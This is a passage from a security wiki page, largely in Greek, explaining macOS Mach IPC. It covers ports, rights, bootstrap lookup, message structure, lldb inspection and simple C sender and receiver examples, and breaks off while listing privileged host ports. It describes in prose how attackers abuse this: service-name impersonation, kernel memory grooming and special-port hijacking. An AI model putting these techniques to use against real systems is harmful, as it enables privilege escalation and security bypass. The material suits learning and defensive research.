# macOS IPC - Inter Process Communication

{{#include ../../../../banners/hacktricks-training.md}}

## Mach messaging via Ports

### Basic Information

Το Mach χρησιμοποιεί τα **tasks** ως τη **μικρότερη μονάδα** για την κοινή χρήση πόρων και κάθε task μπορεί να περιέχει **πολλαπλά threads**. Αυτά τα **tasks και threads αντιστοιχίζονται 1:1 σε POSIX processes και threads**.

Η επικοινωνία μεταξύ tasks πραγματοποιείται μέσω Mach Inter-Process Communication (IPC), χρησιμοποιώντας μονόδρομα κανάλια επικοινωνίας. **Τα messages μεταφέρονται μεταξύ ports**, τα οποία λειτουργούν κατά κάποιον τρόπο ως **message queues** που διαχειρίζεται ο kernel.

Ένα **port** είναι το **βασικό** στοιχείο του Mach IPC. Μπορεί να χρησιμοποιηθεί για **αποστολή και λήψη messages**.

Κάθε process διαθέτει έναν **IPC table**, στον οποίο είναι δυνατό να βρεθούν τα **mach ports του process**. Το όνομα ενός mach port είναι στην πραγματικότητα ένας αριθμός (ένας pointer προς το αντικείμενο του kernel).

Ένα process μπορεί επίσης να στείλει ένα port name μαζί με ορισμένα rights **σε διαφορετικό task** και ο kernel θα κάνει αυτή την καταχώριση να εμφανιστεί στον **IPC table του άλλου task**.

### Port Rights

Τα port rights, τα οποία καθορίζουν ποιες λειτουργίες μπορεί να εκτελέσει ένα task, είναι βασικά για αυτή την επικοινωνία. Τα πιθανά **port rights** είναι ([definitions from here](https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html)):<sup>[[1]](#references)</sup>

- **Receive right**, το οποίο επιτρέπει τη λήψη messages που αποστέλλονται στο port. Τα Mach ports είναι MPSC (multiple-producer, single-consumer) queues, κάτι που σημαίνει ότι μπορεί να υπάρχει μόνο **ένα receive right για κάθε port** σε ολόκληρο το σύστημα (σε αντίθεση με τα pipes, όπου πολλά processes μπορούν να διαθέτουν file descriptors προς το read end ενός pipe).
- Ένα **task με το Receive** right μπορεί να λαμβάνει messages και να **δημιουργεί Send rights**, επιτρέποντάς του να στέλνει messages. Αρχικά, μόνο το **δικό του task έχει Receive right πάνω στο port**.
- Αν ο κάτοχος του Receive right **τερματιστεί** ή το τερματίσει, το **send right καθίσταται άχρηστο (dead name)**.
- **Send right**, το οποίο επιτρέπει την αποστολή messages στο port.
- Το Send right μπορεί να **κλωνοποιηθεί**, ώστε ένα task που διαθέτει Send right να μπορεί να κλωνοποιήσει το right και να **το παραχωρήσει σε ένα τρίτο task**.
- Σημειώστε ότι τα **port rights** μπορούν επίσης να **μεταβιβαστούν** μέσω Mach messages.
- **Send-once right**, το οποίο επιτρέπει την αποστολή ενός message στο port και στη συνέχεια εξαφανίζεται.
- Αυτό το right **δεν μπορεί να κλωνοποιηθεί**, αλλά μπορεί να **μετακινηθεί**.
- **Port set right**, το οποίο δηλώνει ένα _port set_ αντί για ένα μεμονωμένο port. Η αφαίρεση ενός message από ένα port set αφαιρεί ένα message από ένα από τα ports που αυτό περιέχει. Τα port sets μπορούν να χρησιμοποιηθούν για ταυτόχρονη ακρόαση σε πολλά ports, παρόμοια με τα `select`/`poll`/`epoll`/`kqueue` στο Unix.
- **Dead name**, το οποίο δεν αποτελεί πραγματικό port right, αλλά απλώς ένα placeholder. Όταν ένα port καταστρέφεται, όλα τα υπάρχοντα port rights προς το port μετατρέπονται σε dead names.

Τα **tasks μπορούν να μεταβιβάζουν SEND rights σε άλλα tasks**, επιτρέποντάς τους να στέλνουν messages πίσω. Τα **SEND rights μπορούν επίσης να κλωνοποιηθούν, ώστε ένα task να μπορεί να αντιγράψει και να παραχωρήσει το right σε ένα τρίτο task**. Αυτό, σε συνδυασμό με μια ενδιάμεση process γνωστή ως **bootstrap server**, επιτρέπει την αποτελεσματική επικοινωνία μεταξύ tasks.

### File Ports

Τα file ports επιτρέπουν την ενσωμάτωση file descriptors σε Mach ports (χρησιμοποιώντας Mach port rights). Είναι δυνατό να δημιουργηθεί ένα `fileport` από ένα δεδομένο file descriptor με το `fileport_makeport` και να δημιουργηθεί ένα file descriptor από ένα `fileport` με το `fileport_makefd`.

### Establishing a communication

Όπως αναφέρθηκε προηγουμένως, είναι δυνατό να αποσταλούν rights μέσω Mach messages. Ωστόσο, **δεν μπορείτε να στείλετε ένα right χωρίς να διαθέτετε ήδη ένα right** για την αποστολή ενός Mach message. Πώς πραγματοποιείται, λοιπόν, η πρώτη επικοινωνία;

Για αυτό, εμπλέκεται ο **bootstrap server** (**launchd** στο mac), καθώς **οποιοσδήποτε μπορεί να αποκτήσει ένα SEND right προς τον bootstrap server**. Έτσι, είναι δυνατό να ζητηθεί από αυτόν ένα right για την αποστολή ενός message σε άλλο process:

1. Το Task **A** δημιουργεί ένα **νέο port**, αποκτώντας το **RECEIVE right** πάνω σε αυτό.
2. Το Task **A**, ως κάτοχος του RECEIVE right, **δημιουργεί ένα SEND right για το port**.
3. Το Task **A** δημιουργεί μια **σύνδεση** με τον **bootstrap server** και **του στέλνει το SEND right** για το port που δημιούργησε αρχικά.
- Να θυμάστε ότι οποιοσδήποτε μπορεί να αποκτήσει ένα SEND right προς τον bootstrap server.
4. Το Task A στέλνει ένα `bootstrap_register` message στον bootstrap server για να **συσχετίσει το δεδομένο port με ένα όνομα**, όπως `com.apple.taska`
5. Το Task **B** αλληλεπιδρά με τον **bootstrap server** για να εκτελέσει ένα bootstrap **lookup για το όνομα** της υπηρεσίας (`bootstrap_lookup`). Για να μπορέσει ο bootstrap server να απαντήσει, το Task B θα του στείλει ένα **SEND right προς ένα port που είχε δημιουργήσει προηγουμένως**, μέσα στο lookup message. Αν το lookup είναι επιτυχές, ο **server αντιγράφει το SEND right** που έλαβε από το Task A και **το μεταδίδει στο Task B**.
- Να θυμάστε ότι οποιοσδήποτε μπορεί να αποκτήσει ένα SEND right προς τον bootstrap server.
6. Με αυτό το SEND right, το **Task B** μπορεί να **στείλει** ένα **message** **στο Task A**.
7. Για αμφίδρομη επικοινωνία, συνήθως το **Task B** δημιουργεί ένα νέο port με ένα **RECEIVE** right και ένα **SEND** right και παραχωρεί το **SEND right στο Task A**, ώστε αυτό να μπορεί να στέλνει messages στο TASK B (αμφίδρομη επικοινωνία).

Ο bootstrap server **δεν μπορεί να επαληθεύσει** το όνομα της υπηρεσίας που δηλώνει ένα task. Αυτό σημαίνει ότι ένα **task** θα μπορούσε δυνητικά να **προσποιηθεί οποιοδήποτε system task**, για παράδειγμα **δηλώνοντας ψευδώς το όνομα μιας authorization service** και στη συνέχεια εγκρίνοντας κάθε request.

Στη συνέχεια, η Apple αποθηκεύει τα **ονόματα των system-provided services** σε secure configuration files, τα οποία βρίσκονται σε **SIP-protected** directories: `/System/Library/LaunchDaemons` και `/System/Library/LaunchAgents`. Μαζί με κάθε όνομα υπηρεσίας, αποθηκεύεται επίσης το **associated binary**. Ο bootstrap server θα δημιουργήσει και θα διατηρεί ένα **RECEIVE right για κάθε ένα από αυτά τα service names**.

Για αυτές τις προκαθορισμένες services, η διαδικασία **lookup** διαφέρει ελαφρώς. Όταν πραγματοποιείται lookup ενός service name, το launchd εκκινεί δυναμικά την service. Η νέα ροή εργασίας είναι η εξής:

- Το Task **B** ξεκινά ένα bootstrap **lookup** για ένα service name.
- Το **launchd** ελέγχει αν το task εκτελείται και, αν όχι, το **εκκινεί**.
- Το Task **A** (η service) εκτελεί ένα **bootstrap check-in** (`bootstrap_check_in()`). Σε αυτό το σημείο, ο **bootstrap** server δημιουργεί ένα SEND right, το διατηρεί και **μεταβιβάζει το RECEIVE right στο Task A**.
- Το launchd αντιγράφει το **SEND right και το στέλνει στο Task B**.
- Το **Task B** δημιουργεί ένα νέο port με ένα **RECEIVE** right και ένα **SEND** right και παραχωρεί το **SEND right στο Task A** (τη svc), ώστε αυτή να μπορεί να στέλνει messages στο TASK B (αμφίδρομη επικοινωνία).

Ωστόσο, αυτή η διαδικασία ισχύει μόνο για προκαθορισμένα system tasks. Τα non-system tasks εξακολουθούν να λειτουργούν όπως περιγράφηκε αρχικά, γεγονός που θα μπορούσε δυνητικά να επιτρέψει impersonation.

> [!CAUTION]
> Επομένως, το launchd δεν πρέπει ποτέ να καταρρεύσει, διαφορετικά θα καταρρεύσει ολόκληρο το σύστημα.

### A Mach Message

[Find more info here](https://sector7.computest.nl/post/2023-10-xpc-audit-token-spoofing/)<sup>[[4]](#references)</sup>

Η συνάρτηση `mach_msg`, ουσιαστικά ένα system call, χρησιμοποιείται για την αποστολή και τη λήψη Mach messages. Η συνάρτηση απαιτεί το message που πρόκειται να σταλεί ως πρώτο όρισμα. Αυτό το message πρέπει να ξεκινά με μια δομή `mach_msg_header_t`, ακολουθούμενη από το πραγματικό περιεχόμενο του message. Η δομή ορίζεται ως εξής:
```c
typedef struct {
mach_msg_bits_t               msgh_bits;
mach_msg_size_t               msgh_size;
mach_port_t                   msgh_remote_port;
mach_port_t                   msgh_local_port;
mach_port_name_t              msgh_voucher_port;
mach_msg_id_t                 msgh_id;
} mach_msg_header_t;
```
Διεργασίες που διαθέτουν ένα _**receive right**_ μπορούν να λαμβάνουν μηνύματα σε μια θύρα Mach. Αντίστροφα, στους **senders** εκχωρείται ένα _**send**_ ή ένα _**send-once right**_. Το send-once right χρησιμοποιείται αποκλειστικά για την αποστολή ενός μεμονωμένου μηνύματος και, στη συνέχεια, καθίσταται μη έγκυρο.<sup>[[11]](#references)</sup>

Το αρχικό πεδίο **`msgh_bits`** είναι ένα bitmap:

- Το πρώτο bit (το πιο σημαντικό) χρησιμοποιείται για να υποδεικνύει ότι ένα μήνυμα είναι σύνθετο (περισσότερα σχετικά παρακάτω)
- Το 3ο και το 4ο χρησιμοποιούνται από τον kernel
- Τα **5 λιγότερο σημαντικά bits του 2ου byte** μπορούν να χρησιμοποιηθούν για **voucher**: έναν άλλο τύπο θύρας για την αποστολή συνδυασμών key/value.
- Τα **5 λιγότερο σημαντικά bits του 3ου byte** μπορούν να χρησιμοποιηθούν για **local port**
- Τα **5 λιγότερο σημαντικά bits του 4ου byte** μπορούν να χρησιμοποιηθούν για **remote port**

Οι τύποι που μπορούν να καθοριστούν στις voucher, local και remote ports είναι οι εξής (από το [**mach/message.h**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_TYPE_MOVE_RECEIVE      16      /* Must hold receive right */
#define MACH_MSG_TYPE_MOVE_SEND         17      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MOVE_SEND_ONCE    18      /* Must hold sendonce right */
#define MACH_MSG_TYPE_COPY_SEND         19      /* Must hold send right(s) */
#define MACH_MSG_TYPE_MAKE_SEND         20      /* Must hold receive right */
#define MACH_MSG_TYPE_MAKE_SEND_ONCE    21      /* Must hold receive right */
#define MACH_MSG_TYPE_COPY_RECEIVE      22      /* NOT VALID */
#define MACH_MSG_TYPE_DISPOSE_RECEIVE   24      /* must hold receive right */
#define MACH_MSG_TYPE_DISPOSE_SEND      25      /* must hold send right(s) */
#define MACH_MSG_TYPE_DISPOSE_SEND_ONCE 26      /* must hold sendonce right */
```
Για παράδειγμα, το `MACH_MSG_TYPE_MAKE_SEND_ONCE` μπορεί να χρησιμοποιηθεί για να **υποδείξει** ότι ένα **send-once** **right** θα πρέπει να παραχθεί και να μεταφερθεί για αυτό το port. Μπορεί επίσης να καθοριστεί το `MACH_PORT_NULL`, ώστε να μην είναι δυνατή η απάντηση από τον παραλήπτη.

Για την επίτευξη εύκολης **αμφίδρομης επικοινωνίας**, μια διεργασία μπορεί να καθορίσει ένα **mach port** στο **message header** του mach, το οποίο ονομάζεται _reply port_ (**`msgh_local_port`**), όπου ο **receiver** του message μπορεί να **στείλει απάντηση** σε αυτό το message.

> [!TIP]
> Σημειώστε ότι αυτό το είδος αμφίδρομης επικοινωνίας χρησιμοποιείται σε XPC messages που αναμένουν απάντηση (`xpc_connection_send_message_with_reply` και `xpc_connection_send_message_with_reply_sync`). Ωστόσο, **συνήθως δημιουργούνται διαφορετικά ports**, όπως εξηγήθηκε προηγουμένως, για τη δημιουργία της αμφίδρομης επικοινωνίας.

Τα άλλα πεδία του message header είναι:

- `msgh_size`: το μέγεθος ολόκληρου του packet.
- `msgh_remote_port`: το port στο οποίο στέλνεται αυτό το message.
- `msgh_voucher_port`: [mach vouchers](https://robert.sesek.com/2023/6/mach_vouchers.html).
- `msgh_id`: το ID αυτού του message, το οποίο ερμηνεύεται από τον receiver.

> [!CAUTION]
> Σημειώστε ότι τα **mach messages αποστέλλονται μέσω ενός `mach port`**, το οποίο είναι ένα κανάλι επικοινωνίας **single receiver**, **multiple sender**, ενσωματωμένο στον mach kernel. **Πολλαπλές διεργασίες** μπορούν να **στέλνουν messages** σε ένα mach port, αλλά ανά πάσα στιγμή μόνο **μία διεργασία μπορεί να διαβάζει** από αυτό.

Τα messages σχηματίζονται στη συνέχεια από το **`mach_msg_header_t`** header, ακολουθούμενο από το **body** και το **trailer** (εάν υπάρχει), και μπορούν να παρέχουν permission για απάντηση σε αυτά. Σε αυτές τις περιπτώσεις, ο kernel χρειάζεται απλώς να μεταφέρει το message από το ένα task στο άλλο.

Ένα **trailer** είναι **πληροφορίες που προστίθενται στο message από τον kernel** (δεν μπορούν να οριστούν από τον user), οι οποίες μπορούν να ζητηθούν κατά τη λήψη του message με τα flags `MACH_RCV_TRAILER_<trailer_opt>` (υπάρχουν διαφορετικές πληροφορίες που μπορούν να ζητηθούν).

#### Complex Messages

Ωστόσο, υπάρχουν και άλλα πιο **complex** messages, όπως αυτά που μεταφέρουν επιπλέον port rights ή κάνουν sharing μνήμης, όπου ο kernel πρέπει επίσης να στείλει αυτά τα objects στον παραλήπτη. Σε αυτές τις περιπτώσεις, το πιο σημαντικό bit του header `msgh_bits` είναι ενεργοποιημένο.

Οι πιθανοί descriptors που μπορούν να μεταφερθούν ορίζονται στο [**`mach/message.h`**](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html):<sup>[[5]](#references)</sup>
```c
#define MACH_MSG_PORT_DESCRIPTOR                0
#define MACH_MSG_OOL_DESCRIPTOR                 1
#define MACH_MSG_OOL_PORTS_DESCRIPTOR           2
#define MACH_MSG_OOL_VOLATILE_DESCRIPTOR        3
#define MACH_MSG_GUARDED_PORT_DESCRIPTOR        4

#pragma pack(push, 4)

typedef struct{
natural_t                     pad1;
mach_msg_size_t               pad2;
unsigned int                  pad3 : 24;
mach_msg_descriptor_type_t    type : 8;
} mach_msg_type_descriptor_t;
```
Σε 32bits, όλοι οι descriptors είναι 12B και ο τύπος του descriptor βρίσκεται στον 11ο. Σε 64 bits, τα μεγέθη διαφέρουν.

> [!CAUTION]
> Ο kernel θα αντιγράψει τους descriptors από το ένα task στο άλλο, αλλά πρώτα **δημιουργώντας ένα αντίγραφο στη μνήμη του kernel**. Αυτή η τεχνική, γνωστή ως "Feng Shui", έχει γίνει abuse σε αρκετά exploits ώστε να κάνει τον **kernel να αντιγράφει δεδομένα στη μνήμη του**, κάνοντας μια διεργασία να στέλνει descriptors στον εαυτό της. Στη συνέχεια, η διεργασία μπορεί να λάβει τα messages (ο kernel θα τα αποδεσμεύσει).
>
> Είναι επίσης δυνατό να **σταλούν port rights σε μια ευάλωτη διεργασία**, και τα port rights θα εμφανιστούν απλώς στη διεργασία (ακόμα κι αν δεν τα χειρίζεται).

### Mac Ports APIs

Σημειώστε ότι τα ports συσχετίζονται με το namespace του task, επομένως για τη δημιουργία ή την αναζήτηση ενός port γίνεται επίσης query στο namespace του task (περισσότερα στο `mach/mach_port.h`):<sup>[[6]](#references)</sup>

- **`mach_port_allocate` | `mach_port_construct`**: **Δημιουργία** ενός port.
- Το `mach_port_allocate` μπορεί επίσης να δημιουργήσει ένα **port set**: receive right πάνω σε μια ομάδα ports. Κάθε φορά που λαμβάνεται ένα message, υποδεικνύεται το port από το οποίο προήλθε.
- `mach_port_allocate_name`: Αλλαγή του ονόματος του port (από προεπιλογή ακέραιος 32bit)
- `mach_port_names`: Λήψη των ονομάτων των ports από έναν στόχο
- `mach_port_type`: Λήψη των δικαιωμάτων ενός task πάνω σε ένα όνομα
- `mach_port_rename`: Μετονομασία ενός port (όπως το dup2 για FDs)
- `mach_port_allocate`: Εκχώρηση ενός νέου RECEIVE, PORT_SET ή DEAD_NAME
- `mach_port_insert_right`: Δημιουργία ενός νέου right σε ένα port όπου διαθέτετε RECEIVE
- `mach_port_...`
- **`mach_msg`** | **`mach_msg_overwrite`**: Functions που χρησιμοποιούνται για **την αποστολή και τη λήψη mach messages**. Η έκδοση overwrite επιτρέπει τον καθορισμό διαφορετικού buffer για τη λήψη του message (η άλλη έκδοση απλώς θα το επαναχρησιμοποιήσει).

### Debug mach_msg

Καθώς οι functions **`mach_msg`** και **`mach_msg_overwrite`** χρησιμοποιούνται για την αποστολή και τη λήψη messages, η τοποθέτηση ενός breakpoint σε αυτές θα επέτρεπε την επιθεώρηση των messages που στάλθηκαν και λήφθηκαν.

Για παράδειγμα, ξεκινήστε το debugging οποιασδήποτε εφαρμογής μπορείτε να κάνετε debug, καθώς θα φορτώσει τη **`libSystem.B`, η οποία θα χρησιμοποιήσει αυτή τη function**.

<pre class="language-armasm"><code class="lang-armasm"><strong>(lldb) b mach_msg
</strong>Breakpoint 1: where = libsystem_kernel.dylib`mach_msg, address = 0x00000001803f6c20
<strong>(lldb) r
</strong>Process 71019 launched: '/Users/carlospolop/Desktop/sandboxedapp/SandboxedShellAppDown.app/Contents/MacOS/SandboxedShellApp' (arm64)
Process 71019 stopped
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
libsystem_kernel.dylib`mach_msg:
->  0x181d3ac20 <+0>:  pacibsp
0x181d3ac24 <+4>:  sub    sp, sp, #0x20
0x181d3ac28 <+8>:  stp    x29, x30, [sp, #0x10]
0x181d3ac2c <+12>: add    x29, sp, #0x10
Target 0: (SandboxedShellApp) stopped.
<strong>(lldb) bt
</strong>* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
* frame #0: 0x0000000181d3ac20 libsystem_kernel.dylib`mach_msg
frame #1: 0x0000000181ac3454 libxpc.dylib`_xpc_pipe_mach_msg + 56
frame #2: 0x0000000181ac2c8c libxpc.dylib`_xpc_pipe_routine + 388
frame #3: 0x0000000181a9a710 libxpc.dylib`_xpc_interface_routine + 208
frame #4: 0x0000000181abbe24 libxpc.dylib`_xpc_init_pid_domain + 348
frame #5: 0x0000000181abb398 libxpc.dylib`_xpc_uncork_pid_domain_locked + 76
frame #6: 0x0000000181abbbfc libxpc.dylib`_xpc_early_init + 92
frame #7: 0x0000000181a9583c libxpc.dylib`_libxpc_initializer + 1104
frame #8: 0x000000018e59e6ac libSystem.B.dylib`libSystem_initializer + 236
frame #9: 0x0000000181a1d5c8 dyld`invocation function for block in dyld4::Loader::findAndRunAllInitializers(dyld4::RuntimeState&) const::$_0::operator()() const + 168
</code></pre>

Για να λάβετε τα arguments του **`mach_msg`**, ελέγξτε τα registers. Αυτά είναι τα arguments (από το [mach/message.h](https://opensource.apple.com/source/xnu/xnu-7195.81.3/osfmk/mach/message.h.auto.html)):
```c
__WATCHOS_PROHIBITED __TVOS_PROHIBITED
extern mach_msg_return_t        mach_msg(
mach_msg_header_t *msg,
mach_msg_option_t option,
mach_msg_size_t send_size,
mach_msg_size_t rcv_size,
mach_port_name_t rcv_name,
mach_msg_timeout_t timeout,
mach_port_name_t notify);
```
Λάβετε τις τιμές από τα registries:
```armasm
reg read $x0 $x1 $x2 $x3 $x4 $x5 $x6
x0 = 0x0000000124e04ce8 ;mach_msg_header_t (*msg)
x1 = 0x0000000003114207 ;mach_msg_option_t (option)
x2 = 0x0000000000000388 ;mach_msg_size_t (send_size)
x3 = 0x0000000000000388 ;mach_msg_size_t (rcv_size)
x4 = 0x0000000000001f03 ;mach_port_name_t (rcv_name)
x5 = 0x0000000000000000 ;mach_msg_timeout_t (timeout)
x6 = 0x0000000000000000 ;mach_port_name_t (notify)
```
Εξετάστε την κεφαλίδα του μηνύματος ελέγχοντας το πρώτο όρισμα:
```armasm
(lldb) x/6w $x0
0x124e04ce8: 0x00131513 0x00000388 0x00000807 0x00001f03
0x124e04cf8: 0x00000b07 0x40000322

; 0x00131513 -> mach_msg_bits_t (msgh_bits) = 0x13 (MACH_MSG_TYPE_COPY_SEND) in local | 0x1500 (MACH_MSG_TYPE_MAKE_SEND_ONCE) in remote | 0x130000 (MACH_MSG_TYPE_COPY_SEND) in voucher
; 0x00000388 -> mach_msg_size_t (msgh_size)
; 0x00000807 -> mach_port_t (msgh_remote_port)
; 0x00001f03 -> mach_port_t (msgh_local_port)
; 0x00000b07 -> mach_port_name_t (msgh_voucher_port)
; 0x40000322 -> mach_msg_id_t (msgh_id)
```
Αυτός ο τύπος του `mach_msg_bits_t` είναι πολύ συνηθισμένος για την αποδοχή μιας απάντησης.

### Enumerate ports
```bash
lsmp -p <pid>

sudo lsmp -p 1
Process (1) : launchd
name      ipc-object    rights     flags   boost  reqs  recv  send sonce oref  qlimit  msgcount  context            identifier  type
---------   ----------  ----------  -------- -----  ---- ----- ----- ----- ----  ------  --------  ------------------ ----------- ------------
0x00000203  0x181c4e1d  send        --------        ---            2                                                  0x00000000  TASK-CONTROL SELF (1) launchd
0x00000303  0x183f1f8d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x00000403  0x183eb9dd  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000051b  0x1840cf3d  send        --------        ---            2        ->        6         0  0x0000000000000000 0x00011817  (380) WindowServer
0x00000603  0x183f698d  recv        --------     0  ---      1               N        5         0  0x0000000000000000
0x0000070b  0x175915fd  recv,send   ---GS---     0  ---      1     2         Y        5         0  0x0000000000000000
0x00000803  0x1758794d  send        --------        ---            1                                                  0x00000000  CLOCK
0x0000091b  0x192c71fd  send        --------        D--            1        ->        1         0  0x0000000000000000 0x00028da7  (418) runningboardd
0x00000a6b  0x1d4a18cd  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00006a03  (92247) Dock
0x00000b03  0x175a5d4d  send        --------        ---            2        ->       16         0  0x0000000000000000 0x00001803  (310) logd
[...]
0x000016a7  0x192c743d  recv,send   --TGSI--     0  ---      1     1         Y       16         0  0x0000000000000000
+     send        --------        ---            1         <-                                       0x00002d03  (81948) seserviced
+     send        --------        ---            1         <-                                       0x00002603  (74295) passd
[...]
```
Το **όνομα** είναι το προεπιλεγμένο όνομα που δίνεται στη θύρα (δείτε πώς **αυξάνεται** στα πρώτα 3 bytes). Το **`ipc-object`** είναι το **συσκοτισμένο** μοναδικό **αναγνωριστικό** της θύρας.\
Σημειώστε επίσης πώς οι θύρες με μόνο δικαίωμα **`send`** **προσδιορίζουν τον κάτοχό** τους (όνομα θύρας + pid).\
Σημειώστε επίσης τη χρήση του **`+`** για την ένδειξη **άλλων tasks που είναι συνδεδεμένα στην ίδια θύρα**.

Είναι επίσης δυνατή η χρήση του [**procesxp**](https://www.newosxbook.com/tools/procexp.html) για την προβολή και των **καταχωρισμένων ονομάτων υπηρεσιών** (με απενεργοποιημένο το SIP, λόγω της ανάγκης για το `com.apple.system-task-port`):
```
procesp 1 ports
```
Μπορείτε να εγκαταστήσετε αυτό το tool στο iOS κατεβάζοντάς το από [http://newosxbook.com/tools/binpack64-256.tar.gz](http://newosxbook.com/tools/binpack64-256.tar.gz)

### Παράδειγμα κώδικα

Παρατηρήστε πώς ο **αποστολέας** **δεσμεύει** μια θύρα, δημιουργεί ένα **send right** για το όνομα `org.darlinghq.example` και το στέλνει στον **bootstrap server**, ενώ ο αποστολέας ζήτησε το **send right** αυτού του ονόματος και το χρησιμοποίησε για να **στείλει ένα μήνυμα**.<sup>[[1]](#references)</sup>

{{#tabs}}
{{#tab name="receiver.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc receiver.c -o receiver

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Create a new port.
mach_port_t port;
kern_return_t kr = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
if (kr != KERN_SUCCESS) {
printf("mach_port_allocate() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_allocate() created port right name %d\n", port);


// Give us a send right to this port, in addition to the receive right.
kr = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
if (kr != KERN_SUCCESS) {
printf("mach_port_insert_right() failed with code 0x%x\n", kr);
return 1;
}
printf("mach_port_insert_right() inserted a send right\n");


// Send the send right to the bootstrap server, so that it can be looked up by other processes.
kr = bootstrap_register(bootstrap_port, "org.darlinghq.example", port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_register() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_register()'ed our port\n");


// Wait for a message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
mach_msg_trailer_t trailer;
} message;

kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_RCV_MSG,     // Options. We're receiving a message.
0,                // Size of the message being sent, if sending.
sizeof(message),  // Size of the buffer for receiving.
port,             // The port to receive a message on.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Got a message\n");

message.some_text[9] = 0;
printf("Text: %s, number: %d\n", message.some_text, message.some_number);
}
```
{{#endtab}}

{{#tab name="sender.c"}}
```c
// Code from https://docs.darlinghq.org/internals/macos-specifics/mach-ports.html
// gcc sender.c -o sender

#include <stdio.h>
#include <mach/mach.h>
#include <servers/bootstrap.h>

int main() {

// Lookup the receiver port using the bootstrap server.
mach_port_t port;
kern_return_t kr = bootstrap_look_up(bootstrap_port, "org.darlinghq.example", &port);
if (kr != KERN_SUCCESS) {
printf("bootstrap_look_up() failed with code 0x%x\n", kr);
return 1;
}
printf("bootstrap_look_up() returned port right name %d\n", port);


// Construct our message.
struct {
mach_msg_header_t header;
char some_text[10];
int some_number;
} message;

message.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, 0);
message.header.msgh_remote_port = port;
message.header.msgh_local_port = MACH_PORT_NULL;

strncpy(message.some_text, "Hello", sizeof(message.some_text));
message.some_number = 35;

// Send the message.
kr = mach_msg(
&message.header,  // Same as (mach_msg_header_t *) &message.
MACH_SEND_MSG,    // Options. We're sending a message.
sizeof(message),  // Size of the message being sent.
0,                // Size of the buffer for receiving.
MACH_PORT_NULL,   // A port to receive a message on, if receiving.
MACH_MSG_TIMEOUT_NONE,
MACH_PORT_NULL    // Port for the kernel to send notifications about this message to.
);
if (kr != KERN_SUCCESS) {
printf("mach_msg() failed with code 0x%x\n", kr);
return 1;
}
printf("Sent a message\n");
}
```
{{#endtab}}
{{#endtabs}}

## Privileged Ports

Ορισμένες ειδικές θύρες επιτρέπουν σε μια εργασία να **εκτελεί ορισμένες ευαίσθητες ενέργειες ή να αποκτά πρόσβαση σε ορισμένα ευαίσθητα δεδομένα** όταν διαθέτει δικαιώματα **SEND** πάνω σε αυτές. Αυτές οι θύρες είναι ενδιαφέρουσες από την οπτική γωνία ενός attacker, τόσο λόγω των δυνατοτήτων τους όσο και λόγω της δυνατότητας **κοινοποίησης δικαιωμάτων SEND μεταξύ εργασιών**.

### Host Special Ports

Αυτές οι θύρες αναπαρίστανται από έναν αριθμό.

Τα δικαιώματα **SEND** μπορούν να αποκτηθούν καλώντας το **`host_get_special_port`**, ενώ τα δικαιώματα **RECEIVE** καλώντας το **`host_set_special_port`**. Ωστόσο, και οι δύο κλήσεις απαιτούν τη θύρα **`host_priv`**, στην οποία μπορεί να έχει πρόσβαση μόνο ο root. Επιπλέον, στο παρελθόν ο root μπορούσε να καλέσει το **`host_set_special_port`** και να κάνει hijack αυθαίρετων θυρών, κάτι που επέτρεπε, για παράδειγμα, την παράκαμψη των code signatures μέσω hijack του `HOST_KEXTD_PORT` (το SIP πλέον το αποτρέπει).

Αυτές χωρίζονται σε 2 ομάδες: Οι **πρώτες 7 θύρες ανήκουν στον kernel**, με την 1 να είναι η `HOST_PORT`, τη 2 η `HOST_PRIV_PORT`, τη 3 η `HOST_IO_MASTER_PORT` και τη 7 να είναι η `HOST_MAX_SPECIAL_KERNEL_PORT`.\
Όσες ξεκινούν **από** τον αριθμό **8** **ανήκουν σε system daemons** και μπορούν να βρεθούν δηλωμένες στο [**`host_special_ports.h`**](https://opensource.apple.com/source/xnu/xnu-4570.1.46/osfmk/mach/host_special_ports.h.auto.html).

- **Host port**: Αν μια διεργασία έχει προνόμιο **SEND** πάνω σε αυτήν τη θύρα, μπορεί να λάβει **πληροφορίες** σχετικά με το **σύστημα**, καλώντας τις ρουτίνες της, όπως:
- `host_processor_info`: Λήψη πληροφοριών για τον processor
- `host_info`: Λήψη πληροφοριών για το host
- `host_virtual_physical_table_info`: Πίνακας σελίδων Virtual/Physical (απαιτεί MACH_VMDEBUG)
- `host_statistics`: Λήψη στατιστικών του host
- `mach_memory_info`: Λήψη της διάταξης μνήμης του kernel
- **Host Priv port**: Μια διεργασία με δικαίωμα **SEND** πάνω σε αυτήν τη θύρα μπορεί να εκτελεί **προνομιούχες ενέργειες**, όπως την εμφάνιση δεδομένων εκκίνησης ή την προσπάθεια φόρτωσης ενός kernel extension. Η **διεργασία πρέπει να είναι root** για να αποκτήσει αυτό το δικαίωμα.
- Επιπλέον, για την κλήση του API **`kext_request`** απαιτούνται άλλα entitlements **`com.apple.private.kext*`**, τα οποία παρέχονται μόνο σε Apple binaries.
- Άλλες ρουτίνες που μπορούν να κληθούν είναι:
